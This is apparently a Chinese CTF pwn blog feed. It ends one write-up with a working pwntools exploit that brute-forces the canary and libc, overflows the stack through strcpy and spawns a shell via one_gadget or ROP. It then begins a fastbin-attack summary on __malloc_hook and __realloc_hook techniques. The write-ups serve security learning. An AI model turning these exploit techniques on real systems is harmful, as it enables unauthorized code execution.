<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">fastcall <span class="title">login</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> v1; <span class="comment">// rax</span></span><br><span class="line">    <span class="keyword">char</span> s; <span class="comment">// [rsp+10h] [rbp-80h]</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Your passowrd :"</span>);</span><br><span class="line">    get_input((<span class="keyword">unsigned</span> __int8 *)&amp;s, <span class="number">0x7F</span>u);</span><br><span class="line">    v1 = <span class="built_in">strlen</span>(&amp;s);</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strncmp</span>(&amp;s, a1, v1) )</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Failed !"</span>);</span><br><span class="line">    login_state = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Login Success !"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>copy</code>功能，顾名思义：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">fastcall <span class="title">copy</span><span class="params">(<span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> src; <span class="comment">// [rsp+10h] [rbp-80h]</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Copy :"</span>);</span><br><span class="line">    get_input((<span class="keyword">unsigned</span> __int8 *)&amp;src, <span class="number">0x3F</span>u);</span><br><span class="line">    <span class="built_in">strcpy</span>(a1, &amp;src);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"It is magic copy !"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>对应<code>main</code>函数中的变量来看，这个<code>copy</code>其实就是往<code>v6</code>进行copy：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_QWORD *v3; <span class="comment">// rcx</span></span><br><span class="line">__int64 v4; <span class="comment">// rdx</span></span><br><span class="line"><span class="keyword">char</span> v6; <span class="comment">// [rsp+0h] [rbp-60h]</span></span><br><span class="line">__int64 buf; <span class="comment">// [rsp+40h] [rbp-20h]</span></span><br><span class="line">__int64 v8; <span class="comment">// [rsp+48h] [rbp-18h]</span></span><br><span class="line"><span class="keyword">char</span> v9; <span class="comment">// [rsp+50h] [rbp-10h]</span></span><br></pre></td></tr></table></figure>

<h1 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h1><ul>
<li><code>login</code>的局部变量<code>s</code>和<code>copy</code>的局部变量<code>v6</code>共享栈空间，但是<code>s</code>可以写入0x7F字节，因此<code>strcpy(a1, &amp;src);</code>这里就可以造成<code>copy</code>的参数<code>a1</code>其实也就是<code>main</code>里面的局部变量<code>v6</code>的溢出。</li>
<li>再者由于它<code>login</code>的比较逻辑如下，显然这个<code>v1</code>是很容易控制的，那么就可以用来逐字节爆破栈上的东西，这样libc，PIE，以及0x10字节的canary都可以有。因为这里我是想不用one_gadget，那么就必须要得到PIE来写gadgets控rdi（<del>其实就是比one_gadget复杂，但我就是想试试rop</del>）。  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line">v1 = <span class="built_in">strlen</span>(&amp;s);</span><br><span class="line"><span class="keyword">if</span> ( <span class="built_in">strncmp</span>(&amp;s, a1, v1) )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Failed !"</span>);</span><br></pre></td></tr></table></figure></li>
<li>写rop的时候还有坑点，就是这里的溢出是通过<code>strcpy</code>来完成的，它遇到”\x00”就会停止，但是因为从来就没有从<code>main</code>返回过，所以可以分几步写，而且注意必须从高地址往低地址逐个写，不然低地址的gadgets就会被高地址写的时候给覆盖了。另外因为gadgets以及str_bin_sh的地址高两字节都是”\x00”，所以这里还要逐个地把高字节清零（写高地址gadgets的时候残留的）。这样说可能理解起来比较困难，可以自己调试一下就能发现问题了。</li>
<li>rop写完，直接返回，shell到手。（亲测有效，但是时间有点长）</li>
</ul>
<h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><p>这里exp是我尝试one_gadget的，本地成功了，rop的部分被我注释掉了，远程打通过了。把注释标有one_gadget的部分注释掉，标有rop的取消掉就能跑rop的攻击方法了。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># context.log_level = "debug"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(state, password=<span class="string">""</span>)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">"1"</span>)</span><br><span class="line">    <span class="keyword">if</span> state == <span class="number">1</span>:</span><br><span class="line">        p.sendafter(<span class="string">"Your passowrd :"</span>, password)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">copy</span><span class="params">(content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">"3"</span>)</span><br><span class="line">    p.sendafter(<span class="string">"Copy :"</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">quit</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">"2"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bruteforce</span><span class="params">(init, nbytes, half_bytes=True)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> init != <span class="string">""</span> <span class="keyword">and</span> half_bytes == <span class="literal">True</span>:</span><br><span class="line">        addr = init[:<span class="number">-1</span>]</span><br><span class="line">        half_bytes = ord(init[<span class="number">-1</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        addr = init</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(nbytes):</span><br><span class="line">        print(len(addr))</span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">0</span> <span class="keyword">and</span> half_bytes == <span class="literal">True</span>:</span><br><span class="line">            print(i)</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">0x10</span>):</span><br><span class="line">                payload = addr + chr((j &lt;&lt; <span class="number">4</span>) | half_bytes) + <span class="string">"\x00"</span></span><br><span class="line">                login(<span class="number">1</span>, payload)</span><br><span class="line">                <span class="keyword">if</span> p.recv(<span class="number">8</span>) != <span class="string">"Failed !"</span>:</span><br><span class="line">                    addr += chr((j &lt;&lt; <span class="number">4</span>) | half_bytes)</span><br><span class="line">                    login(<span class="number">0</span>)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">0x100</span>):</span><br><span class="line">                payload = addr + chr(j) + <span class="string">"\x00"</span></span><br><span class="line">                login(<span class="number">1</span>, payload)</span><br><span class="line">                <span class="keyword">if</span> p.recv(<span class="number">8</span>) != <span class="string">"Failed !"</span>:</span><br><span class="line">                    addr += chr(j)</span><br><span class="line">                    login(<span class="number">0</span>)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> addr</span><br><span class="line"></span><br><span class="line">main = <span class="number">0xecf</span></span><br><span class="line">pop_rdi = <span class="number">0x00000000000010c3</span> <span class="comment"># pop rdi ; ret</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x00000000000010c1</span> <span class="comment"># pop rsi ; pop r15 ; ret</span></span><br><span class="line">system_offset = libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">str_bin_sh_offset = libc.search(<span class="string">"/bin/sh"</span>).next()</span><br><span class="line">one_gadget_offset = <span class="number">0xf0567</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># brute force the canary</span></span><br><span class="line">canary = bruteforce(<span class="string">""</span>, <span class="number">0x10</span>, <span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># brute force done</span></span><br><span class="line">success(<span class="string">"Canary leak done!"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># # if write rop chain, then will need the PIE</span></span><br><span class="line"><span class="comment"># # again brute force the PIE</span></span><br><span class="line"><span class="comment"># login(1, "\x00".ljust(0x40, "A"))</span></span><br><span class="line"><span class="comment"># copy("BBBB")</span></span><br><span class="line"><span class="comment"># login(0)</span></span><br><span class="line"><span class="comment"># PIE_related = u64(bruteforce("\x70\x0b", 6).ljust(8, "\x00"))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # brute force done</span></span><br><span class="line"><span class="comment"># PIE = PIE_related - 0xb70</span></span><br><span class="line"><span class="comment"># PIE_main = PIE + main</span></span><br><span class="line"><span class="comment"># PIE_pop_rsi_r15 = PIE + pop_rsi_r15</span></span><br><span class="line"><span class="comment"># PIE_pop_rdi = PIE + pop_rdi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># finally brute force the libc</span></span><br><span class="line">login(<span class="number">1</span>, <span class="string">"\x00"</span>.ljust(<span class="number">0x48</span>, <span class="string">"A"</span>))</span><br><span class="line">copy(<span class="string">"BBBB"</span>)</span><br><span class="line">login(<span class="number">0</span>)</span><br><span class="line">libc_related = u64(bruteforce(<span class="string">"A"</span> * <span class="number">8</span> + <span class="string">"\x39\x04"</span>, <span class="number">6</span>)[<span class="number">8</span>:].ljust(<span class="number">8</span>, <span class="string">"\x00"</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># brute force done</span></span><br><span class="line">libc_base = libc_related - <span class="number">0x78439</span></span><br><span class="line">libc_system = libc_base + system_offset</span><br><span class="line">str_bin_sh = libc_base + str_bin_sh_offset</span><br><span class="line"></span><br><span class="line"><span class="comment"># one_gagdet</span></span><br><span class="line">one_gadget = libc_base + one_gadget_offset</span><br><span class="line">payload = <span class="string">"\x00"</span>.ljust(<span class="number">0x40</span>, <span class="string">"C"</span>)</span><br><span class="line">payload += canary</span><br><span class="line">payload = payload.ljust(<span class="number">0x60</span>, <span class="string">"C"</span>)</span><br><span class="line">payload += flat([<span class="number">0xdeadbeefbeefdead</span>, one_gadget])</span><br><span class="line">login(<span class="number">1</span>, payload)</span><br><span class="line">copy(<span class="string">"D"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># # write rop ==&gt; system("/bin/sh")</span></span><br><span class="line"><span class="comment"># # write libc_system first</span></span><br><span class="line"><span class="comment"># payload = "\x00".ljust(0x78, "C")</span></span><br><span class="line"><span class="comment"># payload += flat(([libc_system]))[:-1]</span></span><br><span class="line"><span class="comment"># login(1, payload)</span></span><br><span class="line"><span class="comment"># copy("D")</span></span><br><span class="line"><span class="comment"># login(0)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # then write bin_sh address</span></span><br><span class="line"><span class="comment"># payload = "\x00".ljust(0x70, "C")</span></span><br><span class="line"><span class="comment"># payload += flat(([str_bin_sh]))[:-2] + "C\x00"</span></span><br><span class="line"><span class="comment"># login(1, payload)</span></span><br><span class="line"><span class="comment"># copy("D")</span></span><br><span class="line"><span class="comment"># login(0)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = "\x00".ljust(0x70, "C")</span></span><br><span class="line"><span class="comment"># payload += flat(([str_bin_sh]))</span></span><br><span class="line"><span class="comment"># login(1, payload)</span></span><br><span class="line"><span class="comment"># copy("D")</span></span><br><span class="line"><span class="comment"># login(0)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # then write pop_rdi gadget</span></span><br><span class="line"><span class="comment"># # keep the canary</span></span><br><span class="line"><span class="comment"># payload = "\x00".ljust(0x60, "C")</span></span><br><span class="line"><span class="comment"># payload += flat([0xdeadbeefbeefdead, PIE_pop_rdi])[:-2] + "C\x00"</span></span><br><span class="line"><span class="comment"># login(1, payload)</span></span><br><span class="line"><span class="comment"># copy("D")</span></span><br><span class="line"><span class="comment"># login(0)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = "\x00".ljust(0x40, "C")</span></span><br><span class="line"><span class="comment"># payload += canary</span></span><br><span class="line"><span class="comment"># payload = payload.ljust(0x60, "C")</span></span><br><span class="line"><span class="comment"># payload += flat([0xdeadbeefbeefdead, PIE_pop_rdi])</span></span><br><span class="line"><span class="comment"># login(1, payload)</span></span><br><span class="line"><span class="comment"># copy("D")</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># exit</span></span><br><span class="line">quit()</span><br><span class="line"></span><br><span class="line"><span class="comment"># success("PIE_related: " + hex(PIE_related))</span></span><br><span class="line"><span class="comment"># success("PIE: " + hex(PIE))</span></span><br><span class="line">success(<span class="string">"libc_related: "</span> + hex(libc_related))</span><br><span class="line">success(<span class="string">"libc_base: "</span> + hex(libc_base))</span><br><span class="line">success(<span class="string">"libc_system: "</span> + hex(libc_system))</span><br><span class="line">success(<span class="string">"str_bin_sh: "</span> + hex(str_bin_sh))</span><br><span class="line">success(<span class="string">"one_gadget: "</span> + hex(one_gadget))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><ul>
<li>没啥好小结的，就是普通的rop，只不过爆破时间挺长。</li>
</ul>
]]></content>
      <categories>
        <category>Writeup</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>Fastbin attack 小结</title>
    <url>/2020/04/15/Fastbin-attack-%E5%B0%8F%E7%BB%93/</url>
    <content><![CDATA[<p>这几天刷了四道题，巧了都是Fastbin attack，本来惯用的套路是直接onegadget打<code>__malloc_hook</code>，然后所有onegadget都打不通的情况也很常见，我之前所知道的仅仅局限于<code>__realloc_hook</code>和<code>__malloc_hook</code>的联合使用来调整堆栈，但是也有一定的局限性，这次结合pwnable.tw上的几道题以及CTFhub上收录的CISCN 2019的一道题，小小地总结一下Fastbin attack的一些套路。</p>
<a id="more"></a>

<h1 id="Fastbin"><a href="#Fastbin" class="headerlink" title="Fastbin"></a>Fastbin</h1><h2 id="Free"><a href="#Free" class="headerlink" title="Free"></a>Free</h2><ol>
<li>部分可以参考<a href="https://n0nop.com/2020/04/08/pwn-heap-Spirited-Away/#House-of-spirit-攻击原理">House of Spirit</a>，写得比较详细了。</li>
<li>有看到过fastbin合并的操作，但是因为目前没有接触过所以在这里不涉及，欢迎补充</li>
</ol>
<h2 id="Malloc"><a href="#Malloc" class="headerlink" title="Malloc"></a>Malloc</h2><ol>
<li>malloc一个fastbin的时候，会检查该fastbin的size是否合法： <figure class="highlight c"><table><tr><td class="code"><pre><span class="line">   <span class="comment">// Glibc 2.27</span></span><br><span class="line">   <span class="keyword">size_t</span> victim_idx = fastbin_index (chunksize (victim));</span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (victim_idx != idx, <span class="number">0</span>))</span><br><span class="line">	malloc_printerr (<span class="string">"malloc(): memory corruption (fast)"</span>);</span><br></pre></td></tr></table></figure></li>
<li>与free一个fastbin不同，malloc一个fastbin不受该fastbin必须地址对齐的约束，也就是说只要size满足便可以任意分配</li>
<li>若有其他特征，欢迎补充</li>
</ol>
<h1 id="Fastbin-attack"><a href="#Fastbin-attack" class="headerlink" title="Fastbin attack"></a>Fastbin attack</h1><p>鉴于由于经常遇到直接往<code>__malloc_hook</code>写onegadget，然后通过malloc触发的方法往往不管用的情况，提供一些解决方案。</p>
<h2 id="realloc-realloc-hook-malloc-hook"><a href="#realloc-realloc-hook-malloc-hook" class="headerlink" title="realloc, __realloc_hook, __malloc_hook"></a>realloc, __realloc_hook, __malloc_hook</h2><p>这种方法的思路主要是通过<code>realloc</code>来调整堆栈，使得满足onegadget的约束条件</p>
<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p><br>直接查看<strong>GI__</strong>libc_realloc的汇编码（这里是Glibc 2.27）：</p>
<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="number">0x7ffff7a7cc30</span> &lt;__GI___libc_realloc&gt;:	    <span class="keyword">push</span>   <span class="built_in">r15</span> </span><br><span class="line"><span class="number">0x7ffff7a7cc32</span> &lt;__GI___libc_realloc+<span class="number">2</span>&gt;:	    <span class="keyword">push</span>   <span class="built_in">r14</span></span><br><span class="line"><span class="number">0x7ffff7a7cc34</span> &lt;__GI___libc_realloc+<span class="number">4</span>&gt;:	    <span class="keyword">push</span>   <span class="built_in">r13</span></span><br><span class="line"><span class="number">0x7ffff7a7cc36</span> &lt;__GI___libc_realloc+<span class="number">6</span>&gt;:	    <span class="keyword">push</span>   <span class="built_in">r12</span></span><br><span class="line"><span class="number">0x7ffff7a7cc38</span> &lt;__GI___libc_realloc+<span class="number">8</span>&gt;:	    <span class="keyword">push</span>   <span class="built_in">rbp</span></span><br><span class="line"><span class="number">0x7ffff7a7cc39</span> &lt;__GI___libc_realloc+<span class="number">9</span>&gt;:	    <span class="keyword">push</span>   <span class="built_in">rbx</span></span><br><span class="line"><span class="number">0x7ffff7a7cc3a</span> &lt;__GI___libc_realloc+<span class="number">10</span>&gt;:    <span class="keyword">sub</span>    <span class="built_in">rsp</span>,<span class="number">0x18</span></span><br><span class="line"><span class="number">0x7ffff7a7cc3e</span> &lt;__GI___libc_realloc+<span class="number">14</span>&gt;:    <span class="keyword">mov</span>    <span class="built_in">rax</span>,<span class="built_in">QWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rip</span>+<span class="number">0x35238b</span>]        </span><br><span class="line"><span class="number">0x7ffff7a7cc45</span> &lt;__GI___libc_realloc+<span class="number">21</span>&gt;:    <span class="keyword">mov</span>    <span class="built_in">rax</span>,<span class="built_in">QWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rax</span>] <span class="comment">; __realloc_hook</span></span><br><span class="line"><span class="number">0x7ffff7a7cc48</span> &lt;__GI___libc_realloc+<span class="number">24</span>&gt;:    <span class="keyword">test</span>   <span class="built_in">rax</span>,<span class="built_in">rax</span> <span class="comment">; test if __realloc_hook != NULL</span></span><br><span class="line"><span class="number">0x7ffff7a7cc4b</span> &lt;__GI___libc_realloc+<span class="number">27</span>&gt;:    <span class="keyword">jne</span>    <span class="number">0x7ffff7a7cee0</span> &lt;__GI___libc_realloc+<span class="number">688</span>&gt; <span class="comment">; prepare to call __realloc_hook    </span></span><br><span class="line"><span class="number">0x7ffff7a7cc51</span> &lt;__GI___libc_realloc+<span class="number">33</span>&gt;:    <span class="keyword">test</span>   <span class="built_in">rsi</span>,<span class="built_in">rsi</span></span><br><span class="line"><span class="number">0x7ffff7a7cc54</span> &lt;__GI___libc_realloc+<span class="number">36</span>&gt;:    <span class="keyword">mov</span>    <span class="built_in">rbp</span>,<span class="built_in">rsi</span></span><br><span class="line"><span class="number">0x7ffff7a7cc57</span> &lt;__GI___libc_realloc+<span class="number">39</span>&gt;:    <span class="keyword">mov</span>    <span class="built_in">rbx</span>,<span class="built_in">rdi</span></span><br><span class="line"><span class="number">0x7ffff7a7cc5a</span> &lt;__GI___libc_realloc+<span class="number">42</span>&gt;:    <span class="keyword">sete</span>   <span class="built_in">al</span></span><br><span class="line"><span class="number">0x7ffff7a7cc5d</span> &lt;__GI___libc_realloc+<span class="number">45</span>&gt;:    <span class="keyword">test</span>   <span class="built_in">rdi</span>,<span class="built_in">rdi</span></span><br><span class="line"><span class="number">0x7ffff7a7cc60</span> &lt;__GI___libc_realloc+<span class="number">48</span>&gt;:    <span class="keyword">setne</span>  <span class="built_in">dl</span></span><br><span class="line"><span class="number">0x7ffff7a7cc63</span> &lt;__GI___libc_realloc+<span class="number">51</span>&gt;:    <span class="keyword">and</span>    <span class="built_in">al</span>,<span class="built_in">dl</span></span><br><span class="line"><span class="number">0x7ffff7a7cc65</span> &lt;__GI___libc_realloc+<span class="number">53</span>&gt;:    <span class="keyword">jne</span>    <span class="number">0x7ffff7a7cf10</span> &lt;__GI___libc_realloc+<span class="number">736</span>&gt;</span><br><span class="line"><span class="number">0x7ffff7a7cc6b</span> &lt;__GI___libc_realloc+<span class="number">59</span>&gt;:    <span class="keyword">test</span>   <span class="built_in">rdi</span>,<span class="built_in">rdi</span></span><br><span class="line">..............</span><br><span class="line"><span class="number">0x7ffff7a7cee0</span> &lt;__GI___libc_realloc+<span class="number">688</span>&gt;:   <span class="keyword">mov</span>    <span class="built_in">rdx</span>,<span class="built_in">QWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rsp</span>+<span class="number">0x48</span>]</span><br><span class="line"><span class="number">0x7ffff7a7cee5</span> &lt;__GI___libc_realloc+<span class="number">693</span>&gt;:   <span class="keyword">add</span>    <span class="built_in">rsp</span>,<span class="number">0x18</span></span><br><span class="line"><span class="number">0x7ffff7a7cee9</span> &lt;__GI___libc_realloc+<span class="number">697</span>&gt;:   <span class="keyword">pop</span>    <span class="built_in">rbx</span></span><br><span class="line"><span class="number">0x7ffff7a7ceea</span> &lt;__GI___libc_realloc+<span class="number">698</span>&gt;:   <span class="keyword">pop</span>    <span class="built_in">rbp</span></span><br><span class="line"><span class="number">0x7ffff7a7ceeb</span> &lt;__GI___libc_realloc+<span class="number">699</span>&gt;:   <span class="keyword">pop</span>    <span class="built_in">r12</span></span><br><span class="line"><span class="number">0x7ffff7a7ceed</span> &lt;__GI___libc_realloc+<span class="number">701</span>&gt;:   <span class="keyword">pop</span>    <span class="built_in">r13</span></span><br><span class="line"><span class="number">0x7ffff7a7ceef</span> &lt;__GI___libc_realloc+<span class="number">703</span>&gt;:   <span class="keyword">pop</span>    <span class="built_in">r14</span></span><br><span class="line"><span class="number">0x7ffff7a7cef1</span> &lt;__GI___libc_realloc+<span class="number">705</span>&gt;:   <span class="keyword">pop</span>    <span class="built_in">r15</span></span><br><span class="line"><span class="number">0x7ffff7a7cef3</span> &lt;__GI___libc_realloc+<span class="number">707</span>&gt;:   <span class="keyword">jmp</span>    <span class="built_in">rax</span> <span class="comment">; jump to __realloc_hook to execute</span></span><br><span class="line"><span class="number">0x7ffff7a7cef5</span> &lt;__GI___libc_realloc+<span class="number">709</span>&gt;:   <span class="keyword">nop</span>    <span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rax</span>]</span><br><span class="line"><span class="number">0x7ffff7a7cef8</span> &lt;__GI___libc_realloc+<span class="number">712</span>&gt;:   <span class="keyword">mov</span>    <span class="built_in">rax</span>,<span class="built_in">QWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rip</span>+<span class="number">0x351f69</span>]        </span><br><span class="line"><span class="number">0x7ffff7a7ceff</span> &lt;__GI___libc_realloc+<span class="number">719</span>&gt;:   <span class="keyword">xor</span>    <span class="built_in">r13d</span>,<span class="built_in">r13d</span></span><br><span class="line"><span class="number">0x7ffff7a7cf02</span> &lt;__GI___libc_realloc+<span class="number">722</span>&gt;:   <span class="keyword">mov</span>    <span class="built_in">DWORD</span> <span class="built_in">PTR</span> <span class="built_in">fs</span>:[<span class="built_in">rax</span>],<span class="number">0xc</span></span><br><span class="line"><span class="number">0x7ffff7a7cf09</span> &lt;__GI___libc_realloc+<span class="number">729</span>&gt;:   <span class="keyword">jmp</span>    <span class="number">0x7ffff7a7ce1e</span> &lt;__GI___libc_realloc+<span class="number">494</span>&gt;</span><br><span class="line"><span class="number">0x7ffff7a7cf0e</span> &lt;__GI___libc_realloc+<span class="number">734</span>&gt;:   <span class="keyword">xchg</span>   <span class="built_in">ax</span>,<span class="built_in">ax</span></span><br><span class="line"><span class="number">0x7ffff7a7cf10</span> &lt;__GI___libc_realloc+<span class="number">736</span>&gt;:   <span class="keyword">call</span>   <span class="number">0x7ffff7a7b950</span> &lt;__GI___libc_free&gt;</span><br><span class="line"><span class="number">0x7ffff7a7cf15</span> &lt;__GI___libc_realloc+<span class="number">741</span>&gt;:   <span class="keyword">xor</span>    <span class="built_in">r13d</span>,<span class="built_in">r13d</span></span><br><span class="line"><span class="number">0x7ffff7a7cf18</span> &lt;__GI___libc_realloc+<span class="number">744</span>&gt;:   <span class="keyword">jmp</span>    <span class="number">0x7ffff7a7ce1e</span> &lt;__GI___libc_realloc+<span class="number">494</span>&gt;</span><br><span class="line"><span class="number">0x7ffff7a7cf1d</span> &lt;__GI___libc_realloc+<span class="number">749</span>&gt;:   <span class="keyword">nop</span>    <span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rax</span>]</span><br><span class="line"><span class="number">0x7ffff7a7cf20</span> &lt;__GI___libc_realloc+<span class="number">752</span>&gt;:   <span class="keyword">mov</span>    <span class="built_in">rdx</span>,<span class="built_in">QWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rip</span>+<span class="number">0x351e59</span>]</span><br></pre></td></tr></table></figure>
<p>如果仅仅关注<code>__realloc_hook</code>存在的情况，那么将上述代码提取出来：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x7ffff7a7cc30 &lt;__GI___libc_realloc&gt;:	    push   r15 </span><br><span class="line">0x7ffff7a7cc32 &lt;__GI___libc_realloc+2&gt;:	    push   r14</span><br><span class="line">0x7ffff7a7cc34 &lt;__GI___libc_realloc+4&gt;:	    push   r13</span><br><span class="line">0x7ffff7a7cc36 &lt;__GI___libc_realloc+6&gt;:	    push   r12</span><br><span class="line">0x7ffff7a7cc38 &lt;__GI___libc_realloc+8&gt;:	    push   rbp</span><br><span class="line">0x7ffff7a7cc39 &lt;__GI___libc_realloc+9&gt;:	    push   rbx</span><br><span class="line">0x7ffff7a7cc3a &lt;__GI___libc_realloc+10&gt;:    sub    rsp,0x18</span><br><span class="line">0x7ffff7a7cc3e &lt;__GI___libc_realloc+14&gt;:    mov    rax,QWORD PTR [rip+0x35238b]   ; __realloc_hook     </span><br><span class="line">0x7ffff7a7cc45 &lt;__GI___libc_realloc+21&gt;:    mov    rax,QWORD PTR [rax] ; *__realloc_hook</span><br><span class="line">0x7ffff7a7cee0 &lt;__GI___libc_realloc+688&gt;:   mov    rdx,QWORD PTR [rsp+0x48]</span><br><span class="line">0x7ffff7a7cee5 &lt;__GI___libc_realloc+693&gt;:   add    rsp,0x18</span><br><span class="line">0x7ffff7a7cee9 &lt;__GI___libc_realloc+697&gt;:   pop    rbx</span><br><span class="line">0x7ffff7a7ceea &lt;__GI___libc_realloc+698&gt;:   pop    rbp</span><br><span class="line">0x7ffff7a7ceeb &lt;__GI___libc_realloc+699&gt;:   pop    r12</span><br><span class="line">0x7ffff7a7ceed &lt;__GI___libc_realloc+701&gt;:   pop    r13</span><br><span class="line">0x7ffff7a7ceef &lt;__GI___libc_realloc+703&gt;:   pop    r14</span><br><span class="line">0x7ffff7a7cef1 &lt;__GI___libc_realloc+705&gt;:   pop    r15</span><br><span class="line">0x7ffff7a7cef3 &lt;__GI___libc_realloc+707&gt;:   jmp    rax ; jump to *__realloc_hook to execute</span><br></pre></td></tr></table></figure>
<p>可以明显地看到在<code>realloc</code>开始，这里进行了6次<code>push</code>操作，以及一次<code>sub rsp,0x18</code>，再要跳转到<code>__realloc_hook</code>之前，这里又<code>pop</code>了6次，以及一次<code>add rsp,0x18</code>来进行平衡堆栈。<br><br>所以只要相应地减少<code>push</code>的次数或者直接跳转到<code>__GI___libc_realloc+14</code>的位置执行，就能达到压低栈帧的目的，以满足onegadgeat的约束条件。<br><br>因此，只要将<code>__malloc_hook</code>写入<code>realloc+X</code>，将<code>__realloc_hook</code>写入onegadget，救能达到调整栈的目的。至于<code>X</code>是多少，就可在调试的时候观察执行到onegadget的时候，栈的下方多少位置是0，然后再做相应调整。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">malloc &#x3D;&#x3D;&gt; __malloc_hook(realloc+X) &#x3D;&#x3D;&gt; __realloc_hook(onegadget)</span><br></pre></td></tr></table></figure>
<p><br>注意，这种方法有时候不一定行得通，因为可能在可调整范围内并没有为0的栈位置，也有可能调整后原本为0的位置被改掉了。</p>
<h3 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h3><p>这里暂时没有办法提供举例，但是由于这个方法十分简单并且容易理解，所以讲讲原理就行了。</p>
<h2 id="fastbin-corruption"><a href="#fastbin-corruption" class="headerlink" title="fastbin corruption"></a>fastbin corruption</h2><p>由于fastbin存在的double free检测机制，会调用<code>malloc_printerr</code>，从而间接地调用<code>malloc</code>来触发<code>__malloc_hook</code>。</p>
<h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>原理就不多说了，就是利用fastbin double free corruption来调用<code>__malloc_hook</code>的同时，完成了对onegadget约束的满足。</p>
<h3 id="举例-1"><a href="#举例-1" class="headerlink" title="举例"></a>举例</h3><h4 id="Secret-Garden"><a href="#Secret-Garden" class="headerlink" title="Secret Garden"></a>Secret Garden</h4><p><code>delete</code>功能中存在很明显的free后没有清空指针的漏洞，可以进行fastbin double free</p>
